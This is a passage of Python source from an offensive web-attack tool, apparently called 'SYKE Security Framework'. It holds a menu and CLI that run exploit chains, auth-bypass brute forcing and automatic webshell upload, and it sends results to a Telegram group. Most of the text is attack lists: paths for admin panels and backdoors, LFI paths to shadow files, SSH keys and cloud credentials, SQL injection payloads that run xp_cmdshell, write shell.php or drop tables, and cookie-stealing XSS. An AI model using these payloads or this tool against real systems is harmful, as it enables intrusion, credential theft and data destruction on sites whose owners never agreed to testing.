        elif ch == "8":
            url = _ask("target-url").strip()
            if url:
                full_scan(url)
        elif ch == "9":
            exploit_chain_preset_runner()
        elif ch == "A":
            results_menu()
        elif ch == "B":
            tg_bot_menu()
        elif ch == "C":
            config_menu()
        elif ch == "D":
            print_suggested_methods()
        elif ch == "E":
            url = _ask("target [blank=ask per-tool]").strip()
            extras_menu(url or None)
        elif ch == "F":
            url = _ask("target-url").strip()
            if url:
                admin_finder(url)
        elif ch == "G":
            url = _ask("target-url").strip()
            if url:
                _banner()
                base = normalize_base(url)
                sess = _make_session()
                r = admin_panel_scan(sess, base, TIMEOUT)
                _result_box("ADMIN SCANNER", [
                    f"{GRN if x['status']==200 else YLW}[{x['status']}]{RST}  {x['path']}"
                    for x in r[:40]
                ] or [f"{DIM}No admin panels found{RST}"])
                if r:
                    detail = "\n".join(f"[{x['status']}] {x['path']}" for x in r[:5])
                    _found_box("ADMIN SCANNER", base, detail, found=True)
                _pause()
        elif ch == "H":
            url = _ask("target-url").strip()
            cpanel_menu(url or None)
        elif ch == "I":
            tempmail_menu()
        elif ch == "J":
            grabber_menu()
        elif ch == "K":
            url = _ask("target-url").strip()
            site_hooker(url or None)
        elif ch in ("0","") or ch.lower() in ("exit","quit","q"):
            break
        else:
            time.sleep(0.3)


                                                                                 
                  
                                                                                 

def _arg_parse():
    p = argparse.ArgumentParser(
        prog="syke1999",
        description="SYKE Security Framework v4.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-t","--target",       help="Target URL")
    p.add_argument("-f","--file",         help="File with targets (one per line)")
    p.add_argument("--scan",              help="Auto-run: full|web|vuln|wp|recon|chain")
    p.add_argument("--threads", type=int, default=THREADS, help="Thread count")
    p.add_argument("--timeout", type=float,default=TIMEOUT, help="Request timeout")
    p.add_argument("--delay",   type=float,default=DELAY,   help="Delay between requests")
    p.add_argument("--proxy",             help="HTTP proxy (http://host:port)")
    p.add_argument("--verbose",action="store_true",default=False, help="Verbose output")
    p.add_argument("--out",               default=OUT_DIR,   help="Output directory")
    p.add_argument("--no-login",action="store_true",default=False,
                   help="Skip terminal login gate")
    p.add_argument("--bot",   action="store_true",default=False,
                   help="Start Telegram bot polling only")
    p.add_argument("--token",             help="Telegram bot token (overrides env)")
    return p


                                                                                 
              
                                                                                 

def main():
    global THREADS, TIMEOUT, DELAY, PROXY, PROXY_CFG, VERBOSE, OUT_DIR
    global TELEGRAM_BOT, CURRENT_USER

    os.makedirs(OUT_DIR, exist_ok=True)

    try:
        parser = _arg_parse()
        args, _ = parser.parse_known_args()

        if args.threads: THREADS = args.threads
        if args.timeout: TIMEOUT = args.timeout
        if args.delay:   DELAY   = args.delay
        if args.proxy:
            PROXY = args.proxy
            PROXY_CFG = args.proxy
        if args.verbose: VERBOSE = True
        if args.out:
            OUT_DIR = args.out
            os.makedirs(OUT_DIR, exist_ok=True)
        if args.token:
            TELEGRAM_BOT = args.token

        if args.bot:
            _banner()
            if not TELEGRAM_BOT:
                token = _ask("telegram-bot-token").strip()
                if token:
                    TELEGRAM_BOT = token
            if TELEGRAM_BOT:
                bot = SykeBot(TELEGRAM_BOT)
                _clean(f"Bot polling started. Group: {TG_RESULT_GROUP}")
                bot.run_polling()
            else:
                _err("No bot token provided")
            return

        if not args.no_login:
            _terminal_login()

        start_bot_thread()

        if args.scan and (args.target or args.file):
            _banner()
            scan    = args.scan.lower()
            targets = (_load_targets(args.file)
                       if args.file else [args.target])
            for t in targets:
                if scan == "full":      full_scan(t)
                elif scan == "web":
                    fingerprint(t)
                    backup_scan(t)
                    security_headers_scan(t)
                elif scan == "vuln":
                    sqli_scan(t)
                    lfi_scan(t)
                    xss_scan(t)
                elif scan == "wp":      wp_full_audit(t)
                elif scan == "recon":   recon_menu(t)
                elif scan == "chain":
                    sess = _make_waf_session()
                    base = normalize(t.rstrip("/"))
                    run_exploit_chain_preset(
                        sess, base, "aggressive", timeout=TIMEOUT)
                elif scan == "brute":   auth_bypass_scan(t)
                elif scan == "admin":   admin_finder(t)
                elif scan == "upload":  auto_webshell_upload(t)
            _export_results_formats()
            return

        main_menu()

    except KeyboardInterrupt:
        print()
        print(BLU + "\n  Interrupted. Stay stealthy.\n" + RST)
        print(f"\n  {PUR}{BLD}coded by syke{RST}\n")
        sys.exit(0)
    except Exception as e:
        _err(f"Fatal: {e}")
        if DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)



                                                                                 
                                                        
                                                                                 

EXTENDED_DIRB_WORDLIST = [
    "about","about-us","about_us","aboutus","abstract","access",
    "account","accounts","action","actions","active","activities",
    "activity","add","admin","admin_area","admin_cp","admincp",
    "adminconsole","admincontrol","admin-control","administrator",
    "administrators","admin-login","adminlogin","admin-panel",
    "adminpanel","admin_panel","adminportal","admin-portal",
    "admins","adminsite","admin_site","adminstration","admin-user",
    "adminuser","admin_users","adminzone","admin-zone",
    "ads","advertise","affiliate","affiliates","ajax","album",
    "albums","alert","alerts","analytics","app","application",
    "applications","apply","archive","archives","article","articles",
    "assets","attachment","attachments","audit","auth","authenticate",
    "authentication","author","authors","authorization","avatar",
    "avatars","award","awards","backend","banner","banners","base",
    "batch","bin","blog","blogs","board","bookmark","bookmarks",
    "build","cache","campaign","campaigns","cart","catalog","cdn",
    "certs","channel","channels","chat","checkout","chrome","client",
    "clients","cloud","cms","code","comment","comments","component",
    "components","config","configs","configuration","configurations",
    "connect","console","contact","content","control","core","cron",
    "css","custom","customer","customers","dashboard","data","database",
    "debug","default","delete","deploy","deployment","dev","develop",
    "developer","developers","development","devops","diagnostic",
    "diagnostics","direct","docs","document","documentation",
    "documents","download","downloads","draft","drafts","dump",
    "edit","editor","email","emails","engine","error","errors",
    "event","events","exchange","export","exports","extensions",
    "feed","feedback","file","files","filter","filters","flag",
    "flags","folder","forum","forums","framework","front","frontend",
    "function","functions","gallery","generate","git","global",
    "graph","graphql","group","groups","guest","guide","guides",
    "handler","health","help","hidden","home","hook","hooks",
    "html","http","image","images","import","imports","index",
    "info","integration","integrations","internal","js","jobs",
    "json","key","keys","lab","labs","layout","layouts","legacy",
    "lib","library","link","links","list","locale","locales",
    "lock","log","logger","logging","login","logout","logs",
    "mail","mailing","maintenance","manage","manager","manifest",
    "media","member","members","menu","menus","message","messages",
    "metrics","misc","mobile","model","models","module","modules",
    "monitor","monitoring","nav","navigation","node","nodes","notice",
    "notification","notifications","object","objects","offline",
    "old","ops","options","order","orders","output","overview",
    "package","packages","page","pages","panel","param","params",
    "patch","payment","payments","permission","permissions","plugin",
    "plugins","portal","post","posts","preference","preferences",
    "private","profile","profiles","public","query","queue","queues",
    "rate","redirect","register","registration","report","reports",
    "resource","resources","rest","review","reviews","role","roles",
    "root","route","routes","run","script","scripts","search",
    "secret","secrets","security","server","service","services",
    "session","sessions","settings","share","shares","shop","signal",
    "site","sites","smtp","sql","ssl","stage","staging","static",
    "stats","status","store","stream","support","sync","system",
    "task","tasks","template","templates","test","testing","theme",
    "themes","token","tokens","tool","tools","trace","tracking",
    "transfer","trigger","triggers","type","types","update","updates",
    "upload","uploads","user","users","vendor","view","views","vote",
    "web","webhook","webhooks","widget","widgets","worker","workers",
    "workspace","xml","zone",
    "a","aa","aaa","ab","abc","api2","api3","api4","api5","app2",
    "app3","b","bb","bc","c","cc","d","dd","e","f","g","h","i",
    "j","k","l","m","n","o","p","q","r","s","t","u","v","w","x",
    "y","z","0","1","2","3","4","5","6","7","8","9","10","11","12",
    "00","01","02","03","04","05","06","07","08","09",
    "api-v1","api-v2","api-v3","rest-api","json-api","xml-api",
    "soap-api","graphql-api","grpc-api","rpc-api","rpc",
    "v1","v2","v3","v4","v5","v6","v7","v8","v9","v10",
    "v1.0","v2.0","v3.0","v1.1","v2.1","v1.2","v1.3",
    "2fa","mfa","otp","totp","hotp","sms-verify","email-verify",
    "phone-verify","verify","verification","verifications",
    "activate","activation","activations","deactivate","deactivation",
    "invite","invites","invitation","invitations","referral","referrals",
    "promo","promos","promotion","promotions","discount","discounts",
    "coupon","coupons","voucher","vouchers","gift","gifts",
    "campaign","campaigns","mailing-list","newsletter","newsletters",
    "subscriber","subscribers","subscription","subscriptions",
    "payment-gateway","checkout-success","checkout-cancel","order-complete",
    "payment-success","payment-failure","payment-cancel",
    "invoice","invoices","receipt","receipts","billing","bills",
    "quote","quotes","estimate","estimates","proposal","proposals",
    "contract","contracts","agreement","agreements","terms","privacy",
    "legal","compliance","policy","policies","gdpr","ccpa","hipaa",
    "cookie","cookies","consent","consents",
    "sitemap","robots","humans","ads.txt","security.txt","well-known",
    "manifest.json","manifest.webmanifest","sw.js","service-worker.js",
    "browserconfig.xml","crossdomain.xml","clientaccesspolicy.xml",
    "apple-touch-icon.png","favicon.ico","favicon.png",
    "phpinfo.php","info.php","test.php","debug.php","dump.php",
    "shell.php","cmd.php","exec.php","eval.php","backdoor.php",
    "shell","cmd","exec","eval","backdoor","webshell",
    "wp","wordpress","drupal","joomla","magento","opencart",
    "prestashop","typo3","concrete5","silverstripe","craft",
    "django","flask","rails","laravel","symfony","codeigniter",
    "struts","spring","tomcat","jboss","weblogic","glassfish",
    "wildfly","iis","apache","nginx","lighttpd","caddy",
    "ftp","sftp","ftps","ssh","telnet","smtp","imap","pop3",
    "dns","ntp","snmp","rdp","vnc","ldap","radius","tacacs",
    "mysql","postgres","mongodb","redis","memcache","cassandra",
    "elasticsearch","solr","couchdb","neo4j","influxdb","clickhouse",
    "rabbitmq","kafka","nats","activemq","mosquitto","zeromq",
    "prometheus","grafana","kibana","jaeger","zipkin",
    "consul","vault","nomad","etcd","zookeeper","marathon",
    "jenkins","gitlab","bitbucket","sonarqube","nexus","artifactory",
    "jira","confluence","bamboo","teamcity","circleci","travis",
    "ansible","terraform","puppet","chef","salt","vagrant",
    "docker","kubernetes","helm","istio","linkerd","envoy",
    "nginx-status","apache-status","phpfpm-status","haproxy-stats",
    "server-status","server-info","mod_status","mod_info",
    "actuator","actuator/health","actuator/env","actuator/beans",
    "actuator/mappings","actuator/metrics","actuator/info",
    "actuator/httptrace","actuator/logfile","actuator/dump",
    "actuator/heapdump","actuator/threaddump","actuator/shutdown",
    "actuator/refresh","actuator/restart","actuator/pause",
    "actuator/resume","actuator/flyway","actuator/liquibase",
    "actuator/scheduledtasks","actuator/sessions","actuator/caches",
    "actuator/conditions","actuator/configprops",
    "metrics","health","liveness","readiness","startup","ping",
    "readyz","livez","healthz","healthcheck","health-check",
    "ready","alive","started","status","version","info","about",
    "whoami","me","self","current","id","identity","profile",
    "env","environment","config","settings","configuration",
    "vars","variables","props","properties","params","parameters",
    "debug","trace","verbose","development","test","sandbox",
    "swagger","swagger-ui","api-docs","openapi","redoc","rapidoc",
    "swagger.json","swagger.yaml","openapi.json","openapi.yaml",
    "api.json","api.yaml","schema.json","graphql/schema",
    "wsdl","wadl","raml","blueprint","apib",
    "phpMyAdmin","phpmyadmin","pma","PMA","phpmyadm1n",
    "adminer","adminer.php","dbAdmin","db-admin","db_admin",
    "rockmongo","expressjs","mongoclient","mongo-express",
    "redis-commander","redis-cli","redisinsight",
    "Portainer","portainer","rancher","Rancher",
    "netdata","grafana","prometheus","alertmanager",
    "kibana","logstash","elastic","beats",
    "graylog","papertrail","fluentd","fluentbit",
    "jaeger","zipkin","lightstep","honeycomb",
    "sentry","rollbar","bugsnag","raygun","airbrake",
    "superset","metabase","redash","tableau","looker",
    "airflow","luigi","prefect","dagster","kedro",
    "zeppelin","jupyter","rstudio","shiny",
    "minio","s3","blob","bucket","object-storage",
    "nifi","kafka-ui","akhq","kafdrop","offset-explorer",
    "rabbitmq-management","activemq-console","artemis-console",
    "nagios","zabbix","icinga","checkmk","observium","librenms",
    "prtg","opennms","opsview","centreon","solarwinds",
    "burp","zaproxy","metasploit","sqlmap","nmap","nikto",
    "dirbuster","gobuster","ffuf","nuclei","subfinder","amass",
    "shodan","censys","fofa","zoomeye","binaryedge",
    "cve","exploit","payload","poc","rce","sqli","xss","lfi",
    "ssrf","xxe","csrf","cors","idor","ssti","deserialization",
    ".git",".svn",".hg",".bzr","CVS",".idea",".vscode",
    ".env",".env.local",".env.development",".env.staging",
    ".env.production",".env.test",".env.bak",".env.backup",
    ".env.old",".env.copy","secrets","credentials","keys",
    "private","private_key","id_rsa","id_ed25519","id_ecdsa",
    "aws-credentials","azure-credentials","gcp-credentials",
    "cloud-credentials","terraform.tfstate","terraform.tfvars",
    "ansible.cfg","ansible/hosts","inventory","Makefile","Dockerfile",
    "docker-compose.yml","docker-compose.yaml","docker-compose.json",
    "k8s","kubernetes","kube","kustomization.yaml",
    "helm","chart","values.yaml","values-prod.yaml",
    "serverless.yml","serverless.json","sam-template.yaml",
    "cloudformation.yaml","pulumi.yaml","cdk.json",
    "package.json","package-lock.json","yarn.lock","pnpm-lock.yaml",
    "composer.json","composer.lock","Gemfile","Gemfile.lock",
    "requirements.txt","requirements-dev.txt","Pipfile","Pipfile.lock",
    "pyproject.toml","setup.py","setup.cfg","tox.ini",
    "go.mod","go.sum","Cargo.toml","Cargo.lock",
    "pom.xml","build.gradle","build.gradle.kts","settings.gradle",
    "maven-wrapper.properties","gradle-wrapper.properties",
    "Makefile","Rakefile","Gruntfile.js","Gulpfile.js",
    ".travis.yml",".circleci","Jenkinsfile","Bitbucket-pipelines.yml",
    ".github/workflows",".gitlab-ci.yml","azure-pipelines.yml",
    "sonar-project.properties",".snyk","dependabot.yml",
    "CHANGELOG.md","CHANGELOG.txt","CHANGES.md","CHANGES.txt",
    "RELEASE.md","RELEASE.txt","RELEASES.md","RELEASES.txt",
    "TODO.md","TODO.txt","FIXME.md","NOTES.md","NOTES.txt",
    "SECURITY.md","security.txt","BUG_BOUNTY.md","DISCLOSURE.md",
    "VULNERABILITY.md","HACKING.md","CONTRIBUTING.md",
    "AUTHORS","CONTRIBUTORS","MAINTAINERS","OWNERS","CODEOWNERS",
    "LICENSE","LICENSE.md","LICENSE.txt","NOTICE","NOTICE.md",
    "README","README.md","README.txt","readme.md","readme.txt",
    "INSTALL","INSTALL.md","INSTALL.txt","USAGE.md","USAGE.txt",
    "DEPLOYMENT.md","ARCHITECTURE.md","DESIGN.md","API.md",
    "ERROR","ERRORS","404","500","503","maintenance","coming-soon",
    "under-construction","offline","down","sorry","oops",
    "login-error","auth-error","access-denied","forbidden","unauthorized",
    "not-found","gone","redirect","moved","upgrade","deprecated",
    "old","legacy","classic","v1-legacy","deprecated-api",
    "old-api","old-admin","legacy-admin","backup-admin","admin-backup",
    "temp","temporary","tmp","cache","cached","flush","purge","clear",
    "preview","draft","staging","test","demo","sandbox","lab","dev",
    "development","staging2","uat","qa","ci","cd","build","release",
    "nightly","canary","beta","alpha","rc","hotfix","bugfix","patch",
    "mirror","cdn-mirror","backup-site","failover","dr","ha","cluster",
    "shard","replica","slave","master","primary","secondary","standby",
    "node1","node2","node3","server1","server2","server3",
    "web1","web2","web3","app1","app2","app3","db1","db2","db3",
    "api1","api2","api3","cache1","cache2","cache3",
    "us","eu","asia","uk","de","fr","jp","au","ca","in","br",
    "us-east","us-west","eu-west","eu-central","ap-southeast",
    "east","west","north","south","central","global","local",
    "internal","external","public","private","restricted","secure",
    "hidden","secret","protected","locked","auth","noauth",
    "anon","anonymous","guest","staff","team","operator","support",
    "helpdesk","moderator","editor","author","reviewer","approver",
    "accountant","finance","hr","marketing","sales","devops","sre",
]

                                                                                 
                                      
                                                                                 

EXTENDED_LFI_PATHS = [
    "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname",
    "/etc/hosts", "/etc/hosts.allow", "/etc/hosts.deny",
    "/etc/resolv.conf", "/etc/nsswitch.conf", "/etc/crontab",
    "/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.weekly/",
    "/etc/cron.monthly/", "/var/spool/cron/",
    "/etc/sudoers", "/etc/sudoers.d/",
    "/etc/ssh/sshd_config", "/etc/ssh/ssh_config",
    "/etc/ssl/certs/ca-certificates.crt",
    "/etc/ssl/openssl.cnf", "/etc/pki/tls/certs/ca-bundle.crt",
    "/etc/apache2/apache2.conf", "/etc/apache2/sites-available/000-default.conf",
    "/etc/apache2/conf-available/", "/etc/apache2/mods-available/",
    "/etc/nginx/nginx.conf", "/etc/nginx/sites-available/default",
    "/etc/nginx/conf.d/default.conf", "/etc/nginx/snippets/",
    "/etc/php/7.4/fpm/php.ini", "/etc/php/8.0/fpm/php.ini",
    "/etc/php/8.1/fpm/php.ini", "/etc/php/8.2/fpm/php.ini",
    "/etc/php/8.3/fpm/php.ini",
    "/etc/php.ini", "/usr/local/lib/php.ini",
    "/etc/mysql/my.cnf", "/etc/mysql/mysql.conf.d/mysqld.cnf",
    "/etc/mysql/mariadb.conf.d/50-server.cnf",
    "/var/lib/mysql/mysql/user.MYD",
    "/etc/redis/redis.conf", "/etc/redis.conf",
    "/etc/mongod.conf", "/etc/mongodb.conf",
    "/etc/postgresql/14/main/postgresql.conf",
    "/etc/postgresql/14/main/pg_hba.conf",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/auth.log", "/var/log/syslog",
    "/var/log/secure", "/var/log/messages",
    "/var/log/mail.log", "/var/log/cron.log",
    "/var/log/php7.4-fpm.log", "/var/log/php8.0-fpm.log",
    "/var/log/php-fpm/error.log",
    "/var/log/mysql/error.log", "/var/log/mysql/query.log",
    "/var/log/redis/redis-server.log",
    "/var/log/mongodb/mongod.log",
    "/var/log/postgresql/postgresql-14-main.log",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/exe",
    "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
    "/proc/self/maps", "/proc/self/mem", "/proc/self/status",
    "/proc/self/stat", "/proc/self/wchan", "/proc/self/root",
    "/proc/1/cmdline", "/proc/1/status", "/proc/1/environ",
    "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
    "/proc/filesystems", "/proc/mounts", "/proc/net/arp",
    "/proc/net/if_inet6", "/proc/net/tcp", "/proc/net/udp",
    "/proc/net/fib_trie",
    "/sys/class/net/eth0/address",
    "/sys/class/net/ens3/address",
    "/sys/class/dmi/id/product_name",
    "/sys/class/dmi/id/board_vendor",
    "/root/.bash_history", "/root/.bashrc", "/root/.profile",
    "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts", "/root/.aws/credentials",
    "/home/www-data/.bash_history", "/home/ubuntu/.bash_history",
    "/home/ec2-user/.bash_history",
    "/var/www/html/.env", "/var/www/html/wp-config.php",
    "/var/www/html/config.php", "/var/www/html/configuration.php",
    "/var/www/.env", "/var/www/config.php",
    "/var/www/configuration.php",
    "/usr/local/etc/apache24/httpd.conf",
    "/usr/local/etc/nginx/nginx.conf",
    "/usr/local/etc/php.ini", "/usr/local/etc/php73/php.ini",
    "/usr/local/etc/php80/php.ini",
    "/usr/local/etc/redis.conf",
    "/etc/environment", "/etc/profile",
    "/etc/profile.d/", "/etc/bash.bashrc",
    "/etc/os-release", "/etc/debian_version",
    "/etc/redhat-release", "/etc/centos-release",
    "/etc/fedora-release", "/etc/alpine-release",
    "/etc/arch-release", "/etc/gentoo-release",
    "/etc/issue", "/etc/issue.net", "/etc/motd",
    "/etc/timezone", "/etc/localtime",
    "/etc/apt/sources.list", "/etc/apt/trusted.gpg",
    "/etc/yum.conf", "/etc/yum.repos.d/",
    "/etc/dnf/dnf.conf", "/etc/pacman.conf",
    "/etc/portage/make.conf",
    "/etc/ldap/ldap.conf", "/etc/ldap/slapd.conf",
    "/etc/radius/radiusd.conf",
    "/etc/postfix/main.cf", "/etc/postfix/master.cf",
    "/etc/exim4/exim4.conf",
    "/etc/dovecot/dovecot.conf",
    "/etc/sendmail.cf", "/etc/sendmail.mc",
    "/etc/proftpd.conf", "/etc/vsftpd.conf",
    "/etc/pure-ftpd.conf",
    "/etc/openvpn/server.conf",
    "/etc/wireguard/wg0.conf",
    "/etc/iptables/rules.v4", "/etc/iptables/rules.v6",
    "/etc/fail2ban/jail.conf", "/etc/fail2ban/jail.local",
    "/etc/ufw/user.rules", "/etc/ufw/ufw.conf",
    "/etc/security/limits.conf",
    "/etc/security/access.conf",
    "/etc/pam.d/common-auth", "/etc/pam.d/sshd",
    "/etc/pam.d/su", "/etc/pam.d/sudo",
    "/boot/grub/grub.cfg", "/boot/grub2/grub.cfg",
    "/boot/config-5.15.0-86-generic",
    "/windows/system32/drivers/etc/hosts",
    "/windows/win.ini", "/windows/system.ini",
    "/windows/repair/sam", "/windows/repair/system",
    "/windows/repair/software", "/windows/repair/security",
    "/inetpub/wwwroot/web.config",
    "/inetpub/wwwroot/global.asax",
    "/inetpub/wwwroot/app_code/",
    "/inetpub/wwwroot/app_data/",
    "C:/Windows/system32/drivers/etc/hosts",
    "C:/Windows/win.ini", "C:/Windows/system.ini",
    "C:/inetpub/wwwroot/web.config",
    "C:/xampp/htdocs/config.php",
    "C:/wamp/www/config.php",
    "C:/wamp64/www/config.php",
    "C:/xampp/apache/conf/httpd.conf",
    "C:/wamp/bin/apache/apache2.4.27/conf/httpd.conf",
    "C:/Program Files/MySQL/MySQL Server 8.0/my.ini",
    "C:/ProgramData/MySQL/MySQL Server 8.0/my.ini",
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "..\\..\\..\\etc\\passwd",
    "..%5C..%5C..%5Cetc%5Cpasswd",
]

                                                                                 
                                  
                                                                                 

EXTENDED_SQLI_PAYLOADS = [
    "'","\"","`;","');","');--",
    "' OR '1'='1","' OR '1'='1'--","' OR '1'='1'#",
    "' OR '1'='1'/*","' OR 1=1--","' OR 1=1#","' OR 1=1/*",
    "\" OR \"1\"=\"1","\" OR \"1\"=\"1\"--","\" OR 1=1--",
    "1' OR '1'='1","1\" OR \"1\"=\"1",
    "' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1#",
    "admin'--","admin'#","admin'/*",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--","' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT NULL--","' UNION ALL SELECT 1--",
    "' UNION ALL SELECT 1,2--","' UNION ALL SELECT 1,2,3--",
    "1 UNION SELECT NULL--","1 UNION SELECT NULL,NULL--",
    "1 UNION ALL SELECT 1--","1 UNION ALL SELECT 1,2--",
    "' AND 1=1--","' AND 1=2--","' AND 1=1#","' AND 1=2#",
    "\" AND 1=1--","\" AND 1=2--",
    "1 AND 1=1","1 AND 1=2",
    "1' AND '1'='1","1' AND '1'='2",
    "' AND SLEEP(5)--","\" AND SLEEP(5)--",
    "1 AND SLEEP(5)","1; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--","'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1 OR SLEEP(5)","1' OR SLEEP(5)--",
    "1 XOR SLEEP(5)","1' XOR SLEEP(5)--",
    "' BENCHMARK(10000000,MD5('a'))--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "'; EXEC sp_configure 'xp_cmdshell',1--",
    "'; EXEC sp_executesql N'SELECT 1'--",
    "'; DROP TABLE users--","'; DROP TABLE users;--",
    "'; TRUNCATE TABLE users--",
    "' HAVING 1=1--","' GROUP BY 1--",
    "' ORDER BY 1--","' ORDER BY 2--","' ORDER BY 3--",
    "' ORDER BY 10--","' ORDER BY 100--",
    "1 ORDER BY 1","1 ORDER BY 2","1 ORDER BY 3",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
    "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",
    "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)--",
    "' OR '1'='1' LIMIT 1 OFFSET 0--",
    "' OR BINARY '0'='0",
    "' OR 0x31=0x31--",
    "' OR char(49)=char(49)--",
    "0x27204f522027313d2731",
    "' OR id IS NOT NULL--",
    "' OR username IS NOT NULL--",
    "'/**/OR/**/1=1--",
    "'%20OR%201=1--",
    "'+OR+'1'='1",
    "'%2bOR%2b'1'='1",
    "' OR%201=1--",
    "'%0aOR%0a1=1--",
    "' OR/**/ 1=1--",
    "' OR 1 --",
    "' OR true--",
    "' OR 'x'='x",
    "' OR 1=1 AND 'a'='a",
    "\" OR 1=1 AND \"a\"=\"a",
    "') OR ('1'='1","') OR (1=1)--",
    "')) OR (('1'='1","1)) OR ((1=1)--",
    "' OR id=id--","' OR user=user--",
    "' OR email=email--",
    "' OR name=name--",
    "1;SELECT%20*%20FROM%20users--",
    "1;SELECT%201,2,3--",
    "1 UNION/**/SELECT/**/NULL,NULL,NULL--",
    "1/**/UNION/**/SELECT/**/NULL--",
    "'/*!50000UNION*//*!50000SELECT*/NULL--",
    "'/*!UNION*//*!SELECT*/NULL--",
    "'%20UNION%20SELECT%20NULL--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT username,password,email FROM users--",
    "' UNION SELECT NULL,username,password FROM users--",
    "1; SELECT * FROM INFORMATION_SCHEMA.TABLES--",
    "1; SELECT table_name FROM information_schema.tables--",
    "1; SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
    "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>64--",
    "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)=97--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
    "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
    "1; EXEC master..xp_cmdshell 'whoami'--",
    "1; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
    "1; EXEC master..xp_cmdshell 'dir'--",
    "1; EXEC master..xp_cmdshell 'net user'--",
    "1; SELECT * INTO OUTFILE '/var/www/html/shell.php' FROM users--",
    "' INTO OUTFILE '/var/www/html/shell.php'--",
    "' INTO DUMPFILE '/var/www/html/1.php'--",
    "1; LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE('/etc/shadow')--",
    "'; EXEC xp_fileexist 'c:\\windows\\system32\\cmd.exe'--",
    "'; EXEC xp_dirtree 'c:\\'--",
    "'; BACKUP DATABASE test TO DISK = 'c:\\backup.bak'--",
    "1; SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','password'))--",
    "1; SELECT SUSER_NAME()--",
    "1; SELECT IS_SRVROLEMEMBER('sysadmin')--",
    "' OR pg_sleep(5)--","' OR (SELECT 1 FROM pg_sleep(5))--",
    "1; SELECT pg_sleep(5)--",
    "' UNION SELECT usename,passwd FROM pg_shadow--",
    "' UNION SELECT current_user()--",
    "' UNION SELECT version()--",
    "' UNION SELECT NULL,NULL FROM pg_shadow--",
    "1; COPY (SELECT '') TO PROGRAM 'id'--",
    "'; COPY (SELECT '') TO PROGRAM 'whoami'--",
]

                                                                                 
                        
                                                                                 

EXTENDED_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('xss')>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<button onclick=alert(1)>x</button>",
    "<marquee onstart=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href='javascript:alert(1)'>click</a>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "JaVaScRiPt:alert(1)",
